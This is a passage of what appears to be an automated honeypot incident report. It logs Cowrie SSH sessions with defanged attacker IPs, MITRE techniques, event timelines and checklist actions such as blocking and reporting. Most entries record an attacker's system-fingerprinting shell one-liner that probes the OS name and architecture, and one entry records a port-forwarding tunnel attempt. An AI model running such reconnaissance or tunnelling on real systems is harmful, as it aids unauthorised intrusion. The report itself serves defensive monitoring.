| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:24:42` | `cowrie.session.connect` |
| `2026-07-05 20:24:42` | `cowrie.client.version` |
| `2026-07-05 20:24:42` | `cowrie.client.kex` |
| `2026-07-05 20:24:45` | `cowrie.login.success` |
| `2026-07-05 20:24:46` | `cowrie.session.params` |
| `2026-07-05 20:24:46` | `cowrie.command.input` |
| `2026-07-05 20:24:46` | `cowrie.command.input` |
| `2026-07-05 20:24:46` | `cowrie.command.input` |
| `2026-07-05 20:24:46` | `cowrie.command.input` |
| `2026-07-05 20:24:46` | `cowrie.command.input` |
| `2026-07-05 20:24:46` | `cowrie.command.success` |
| `2026-07-05 20:24:46` | `cowrie.command.input` |
| `2026-07-05 20:24:46` | `cowrie.command.input` |
| `2026-07-05 20:24:47` | `cowrie.command.input` |
| `2026-07-05 20:24:47` | `cowrie.command.input` |
| `2026-07-05 20:24:47` | `cowrie.log.closed` |
| `2026-07-05 20:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-030d66444693

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:26 |
| **Last Seen** | 2026-07-05 20:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:26:24` | `cowrie.session.connect` |
| `2026-07-05 20:26:24` | `cowrie.client.version` |
| `2026-07-05 20:26:24` | `cowrie.client.kex` |
| `2026-07-05 20:26:27` | `cowrie.login.success` |
| `2026-07-05 20:26:28` | `cowrie.session.params` |
| `2026-07-05 20:26:28` | `cowrie.command.input` |
| `2026-07-05 20:26:28` | `cowrie.command.input` |
| `2026-07-05 20:26:28` | `cowrie.command.input` |
| `2026-07-05 20:26:28` | `cowrie.command.input` |
| `2026-07-05 20:26:28` | `cowrie.command.input` |
| `2026-07-05 20:26:28` | `cowrie.command.success` |
| `2026-07-05 20:26:28` | `cowrie.command.input` |
| `2026-07-05 20:26:28` | `cowrie.command.input` |
| `2026-07-05 20:26:28` | `cowrie.command.input` |
| `2026-07-05 20:26:28` | `cowrie.command.input` |
| `2026-07-05 20:26:29` | `cowrie.log.closed` |
| `2026-07-05 20:26:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8834cd6e0343

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:28 |
| **Last Seen** | 2026-07-05 20:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:28:10` | `cowrie.session.connect` |
| `2026-07-05 20:28:11` | `cowrie.client.version` |
| `2026-07-05 20:28:11` | `cowrie.client.kex` |
| `2026-07-05 20:28:15` | `cowrie.login.success` |
| `2026-07-05 20:28:17` | `cowrie.session.params` |
| `2026-07-05 20:28:17` | `cowrie.command.input` |
| `2026-07-05 20:28:17` | `cowrie.command.input` |
| `2026-07-05 20:28:17` | `cowrie.command.input` |
| `2026-07-05 20:28:17` | `cowrie.command.input` |
| `2026-07-05 20:28:17` | `cowrie.command.input` |
| `2026-07-05 20:28:17` | `cowrie.command.success` |
| `2026-07-05 20:28:17` | `cowrie.command.input` |
| `2026-07-05 20:28:17` | `cowrie.command.input` |
| `2026-07-05 20:28:17` | `cowrie.command.input` |
| `2026-07-05 20:28:17` | `cowrie.command.input` |
| `2026-07-05 20:28:18` | `cowrie.log.closed` |
| `2026-07-05 20:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ca3f972c53f

| Field | Detail |
|---|---|
| **Source IP** | `89.23.113[.]208` |
| **First Seen** | 2026-07-05 20:28 |
| **Last Seen** | 2026-07-05 20:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:28:14` | `cowrie.session.connect` |
| `2026-07-05 20:28:14` | `cowrie.client.version` |
| `2026-07-05 20:28:14` | `cowrie.client.kex` |
| `2026-07-05 20:28:14` | `cowrie.login.success` |
| `2026-07-05 20:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.23.113[.]208` to AbuseIPDB if not already reported
- [ ] Block `89.23.113[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19c0df497718

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-05 20:28 |
| **Last Seen** | 2026-07-05 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:28:14` | `cowrie.session.connect` |
| `2026-07-05 20:28:14` | `cowrie.client.version` |
| `2026-07-05 20:28:15` | `cowrie.client.kex` |
| `2026-07-05 20:28:15` | `cowrie.login.success` |
| `2026-07-05 20:28:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b8f448ad1d3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:29 |
| **Last Seen** | 2026-07-05 20:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:29:53` | `cowrie.session.connect` |
| `2026-07-05 20:29:54` | `cowrie.client.version` |
| `2026-07-05 20:29:54` | `cowrie.client.kex` |
| `2026-07-05 20:29:57` | `cowrie.login.success` |
| `2026-07-05 20:30:00` | `cowrie.session.params` |
| `2026-07-05 20:30:00` | `cowrie.command.input` |
| `2026-07-05 20:30:00` | `cowrie.command.input` |
| `2026-07-05 20:30:00` | `cowrie.command.input` |
| `2026-07-05 20:30:00` | `cowrie.command.input` |
| `2026-07-05 20:30:00` | `cowrie.command.input` |
| `2026-07-05 20:30:00` | `cowrie.command.success` |
| `2026-07-05 20:30:00` | `cowrie.command.input` |
| `2026-07-05 20:30:00` | `cowrie.command.input` |
| `2026-07-05 20:30:00` | `cowrie.command.input` |
| `2026-07-05 20:30:00` | `cowrie.command.input` |
| `2026-07-05 20:30:01` | `cowrie.log.closed` |
| `2026-07-05 20:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7501589bee51

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:31 |
| **Last Seen** | 2026-07-05 20:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:31:34` | `cowrie.session.connect` |
| `2026-07-05 20:31:35` | `cowrie.client.version` |
| `2026-07-05 20:31:35` | `cowrie.client.kex` |
| `2026-07-05 20:31:38` | `cowrie.login.success` |
| `2026-07-05 20:31:40` | `cowrie.session.params` |
| `2026-07-05 20:31:40` | `cowrie.command.input` |
| `2026-07-05 20:31:40` | `cowrie.command.input` |
| `2026-07-05 20:31:40` | `cowrie.command.input` |
| `2026-07-05 20:31:40` | `cowrie.command.input` |
| `2026-07-05 20:31:40` | `cowrie.command.input` |
| `2026-07-05 20:31:40` | `cowrie.command.success` |
| `2026-07-05 20:31:40` | `cowrie.command.input` |
| `2026-07-05 20:31:40` | `cowrie.command.input` |
| `2026-07-05 20:31:40` | `cowrie.command.input` |
| `2026-07-05 20:31:40` | `cowrie.command.input` |
| `2026-07-05 20:31:41` | `cowrie.log.closed` |
| `2026-07-05 20:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-425d301b2ed3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 20:32 |
| **Last Seen** | 2026-07-05 20:32 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:32:36` | `cowrie.session.connect` |
| `2026-07-05 20:32:37` | `cowrie.client.version` |
| `2026-07-05 20:32:37` | `cowrie.client.kex` |
| `2026-07-05 20:32:43` | `cowrie.login.success` |
| `2026-07-05 20:32:47` | `cowrie.session.params` |
| `2026-07-05 20:32:47` | `cowrie.command.input` |
| `2026-07-05 20:32:48` | `cowrie.log.closed` |
| `2026-07-05 20:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef76e40d71a4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:33 |
| **Last Seen** | 2026-07-05 20:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:33:15` | `cowrie.session.connect` |
| `2026-07-05 20:33:16` | `cowrie.client.version` |
| `2026-07-05 20:33:16` | `cowrie.client.kex` |
| `2026-07-05 20:33:19` | `cowrie.login.success` |
| `2026-07-05 20:33:22` | `cowrie.session.params` |
| `2026-07-05 20:33:22` | `cowrie.command.input` |
| `2026-07-05 20:33:22` | `cowrie.command.input` |
| `2026-07-05 20:33:22` | `cowrie.command.input` |
| `2026-07-05 20:33:22` | `cowrie.command.input` |
| `2026-07-05 20:33:22` | `cowrie.command.input` |
| `2026-07-05 20:33:22` | `cowrie.command.success` |
| `2026-07-05 20:33:22` | `cowrie.command.input` |
| `2026-07-05 20:33:22` | `cowrie.command.input` |
| `2026-07-05 20:33:22` | `cowrie.command.input` |
| `2026-07-05 20:33:22` | `cowrie.command.input` |
| `2026-07-05 20:33:23` | `cowrie.log.closed` |
| `2026-07-05 20:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b0602383781

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:36 |
| **Last Seen** | 2026-07-05 20:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:36:20` | `cowrie.session.connect` |
| `2026-07-05 20:36:21` | `cowrie.client.version` |
| `2026-07-05 20:36:21` | `cowrie.client.kex` |
| `2026-07-05 20:36:24` | `cowrie.login.success` |
| `2026-07-05 20:36:27` | `cowrie.session.params` |
| `2026-07-05 20:36:27` | `cowrie.command.input` |
| `2026-07-05 20:36:27` | `cowrie.command.input` |
| `2026-07-05 20:36:27` | `cowrie.command.input` |
| `2026-07-05 20:36:27` | `cowrie.command.input` |
| `2026-07-05 20:36:27` | `cowrie.command.input` |
| `2026-07-05 20:36:27` | `cowrie.command.success` |
| `2026-07-05 20:36:27` | `cowrie.command.input` |
| `2026-07-05 20:36:27` | `cowrie.command.input` |
| `2026-07-05 20:36:27` | `cowrie.command.input` |
| `2026-07-05 20:36:27` | `cowrie.command.input` |
| `2026-07-05 20:36:28` | `cowrie.log.closed` |
| `2026-07-05 20:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ea9c73da0eb

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 20:37 |
| **Last Seen** | 2026-07-05 20:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:37:51` | `cowrie.session.connect` |
| `2026-07-05 20:37:51` | `cowrie.client.version` |
| `2026-07-05 20:37:51` | `cowrie.client.kex` |
| `2026-07-05 20:37:51` | `cowrie.login.success` |
| `2026-07-05 20:37:51` | `cowrie.direct-tcpip.request` |
| `2026-07-05 20:37:52` | `cowrie.direct-tcpip.data` |
| `2026-07-05 20:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62aaf581d707

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:37 |
| **Last Seen** | 2026-07-05 20:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:37:52` | `cowrie.session.connect` |
| `2026-07-05 20:37:53` | `cowrie.client.version` |
| `2026-07-05 20:37:53` | `cowrie.client.kex` |
| `2026-07-05 20:37:56` | `cowrie.login.success` |
| `2026-07-05 20:37:59` | `cowrie.session.params` |
| `2026-07-05 20:37:59` | `cowrie.command.input` |
| `2026-07-05 20:37:59` | `cowrie.command.input` |
| `2026-07-05 20:37:59` | `cowrie.command.input` |
| `2026-07-05 20:37:59` | `cowrie.command.input` |
| `2026-07-05 20:37:59` | `cowrie.command.input` |
| `2026-07-05 20:37:59` | `cowrie.command.success` |
| `2026-07-05 20:37:59` | `cowrie.command.input` |
| `2026-07-05 20:37:59` | `cowrie.command.input` |
| `2026-07-05 20:37:59` | `cowrie.command.input` |
| `2026-07-05 20:37:59` | `cowrie.command.input` |
| `2026-07-05 20:38:00` | `cowrie.log.closed` |
| `2026-07-05 20:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f75d641835d3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:39 |
| **Last Seen** | 2026-07-05 20:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:39:23` | `cowrie.session.connect` |
| `2026-07-05 20:39:24` | `cowrie.client.version` |
| `2026-07-05 20:39:24` | `cowrie.client.kex` |
| `2026-07-05 20:39:27` | `cowrie.login.success` |
| `2026-07-05 20:39:29` | `cowrie.session.params` |
| `2026-07-05 20:39:29` | `cowrie.command.input` |
| `2026-07-05 20:39:29` | `cowrie.command.input` |
| `2026-07-05 20:39:29` | `cowrie.command.input` |
| `2026-07-05 20:39:29` | `cowrie.command.input` |
| `2026-07-05 20:39:29` | `cowrie.command.input` |
| `2026-07-05 20:39:29` | `cowrie.command.success` |
| `2026-07-05 20:39:29` | `cowrie.command.input` |
| `2026-07-05 20:39:29` | `cowrie.command.input` |
| `2026-07-05 20:39:29` | `cowrie.command.input` |
| `2026-07-05 20:39:29` | `cowrie.command.input` |
| `2026-07-05 20:39:30` | `cowrie.log.closed` |
| `2026-07-05 20:39:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19bcf8a2b813

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:40 |
| **Last Seen** | 2026-07-05 20:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:40:57` | `cowrie.session.connect` |
| `2026-07-05 20:40:58` | `cowrie.client.version` |
| `2026-07-05 20:40:58` | `cowrie.client.kex` |
| `2026-07-05 20:41:02` | `cowrie.login.success` |
| `2026-07-05 20:41:04` | `cowrie.session.params` |
| `2026-07-05 20:41:04` | `cowrie.command.input` |
| `2026-07-05 20:41:04` | `cowrie.command.input` |
| `2026-07-05 20:41:04` | `cowrie.command.input` |
| `2026-07-05 20:41:04` | `cowrie.command.input` |
| `2026-07-05 20:41:04` | `cowrie.command.input` |
| `2026-07-05 20:41:04` | `cowrie.command.success` |
| `2026-07-05 20:41:04` | `cowrie.command.input` |
| `2026-07-05 20:41:04` | `cowrie.command.input` |
| `2026-07-05 20:41:04` | `cowrie.command.input` |
| `2026-07-05 20:41:04` | `cowrie.command.input` |
| `2026-07-05 20:41:05` | `cowrie.log.closed` |
| `2026-07-05 20:41:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caf24cc63071

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:42 |
| **Last Seen** | 2026-07-05 20:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
